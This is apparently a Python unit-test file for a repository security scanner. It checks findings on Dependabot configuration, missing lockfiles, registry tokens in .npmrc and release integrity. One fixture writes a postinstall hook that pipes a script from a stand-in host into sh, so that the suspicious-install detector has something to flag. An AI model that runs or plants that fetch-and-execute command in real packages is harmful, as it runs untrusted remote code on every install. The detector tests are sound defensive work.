import json
import os
import tempfile
import unittest

from butian.scripts import finding_utils, repo_checks


def write(path, content):
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(content)


class FindingUtilsTests(unittest.TestCase):
    def test_make_finding_schema(self):
        finding = finding_utils.make_finding(
            "repo.example",
            category="repo_governance",
            severity="medium",
            confidence="high",
            file="example.yml",
            line=3,
            title="标题",
            detail="详情",
            evidence="证据",
            recommendation="建议",
        )

        self.assertEqual(finding["id"], "repo.example")
        self.assertEqual(finding["source"], "builtin")
        self.assertFalse(finding["fixable"])
        self.assertEqual(finding["line"], 3)

    def test_line_for_text_returns_first_match(self):
        with tempfile.TemporaryDirectory(prefix="butian-finding-") as root:
            path = os.path.join(root, "a.txt")
            write(path, "one\ntwo\none\n")

            self.assertEqual(finding_utils.line_for_text(path, "two"), 2)
            self.assertIsNone(finding_utils.line_for_text(path, "missing"))


class RepositoryChecksTests(unittest.TestCase):
    def test_security_policy_is_not_reported_as_repository_check(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            findings = repo_checks.scan_repository_checks(root)

            self.assertFalse(any("security_policy" in f["id"] for f in findings))

    def test_codeowners_is_not_reported_as_repository_check(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(os.path.join(root, ".github", "CODEOWNERS"), "/src @team\n")

            findings = repo_checks.scan_repository_checks(root)

            self.assertFalse(
                any("codeowners" in f["id"] for f in findings)
            )

    def test_dependabot_missing_github_actions_ecosystem(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(
                os.path.join(root, ".github", "dependabot.yml"),
                "version: 2\nupdates:\n  - package-ecosystem: npm\n",
            )

            findings = repo_checks.scan_repository_checks(root, ecosystems=["npm"])

            self.assertTrue(
                any(
                    f["id"] == "repo.dependabot_missing_github_actions"
                    for f in findings
                )
            )
            item = next(
                f
                for f in findings
                if f["id"] == "repo.dependabot_missing_github_actions"
            )
            self.assertEqual(item["severity"], "info")
            self.assertEqual(item["kind"], "maintenance_advice")
            self.assertIn("建议", item["title"])

    def test_detects_manifest_without_lockfile(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(os.path.join(root, "package.json"), "{}\n")

            findings = repo_checks.scan_repository_checks(root, ecosystems=["npm"])

            self.assertTrue(
                any(f["id"] == "supply_chain.lockfile_missing" for f in findings)
            )

    def test_detects_suspicious_postinstall(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(os.path.join(root, "package-lock.json"), "{}\n")
            write(
                os.path.join(root, "package.json"),
                json.dumps(
                    {"scripts": {"postinstall": "curl https://x.test/i.sh | sh"}}
                ),
            )

            findings = repo_checks.scan_repository_checks(root, ecosystems=["npm"])

            self.assertTrue(
                any(
                    f["id"] == "supply_chain.suspicious_install_script"
                    for f in findings
                )
            )

    def test_detects_registry_token_config(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            write(
                os.path.join(root, ".npmrc"),
                "//registry.npmjs.org/:_authToken=npm_123456789012345678901234567890123456\n",
            )

            findings = repo_checks.scan_repository_checks(root)

            self.assertTrue(
                any(f["id"] == "supply_chain.registry_token_config" for f in findings)
            )

    def test_reports_release_integrity_as_info_when_no_hints(self):
        with tempfile.TemporaryDirectory(prefix="butian-repo-") as root:
            findings = repo_checks.scan_repository_checks(root)

            release = [
                f for f in findings if f["id"] == "release.integrity_hints_missing"
            ]
            self.assertEqual(release[0]["severity"], "info")


if __name__ == "__main__":
    unittest.main()
